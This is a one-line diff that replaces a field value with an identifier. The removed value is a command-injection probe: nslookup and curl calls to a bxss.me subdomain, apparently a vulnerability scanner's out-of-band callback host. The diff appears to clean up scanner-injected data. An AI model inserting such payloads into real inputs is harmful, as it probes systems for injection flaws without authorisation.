@@ -1,1 +1,1 @@
-(nslookup -q=cname hitvasyccuhrqa3c03.bxss.me||curl hitvasyccuhrqa3c03.bxss.me))
+MO_820335782779_000
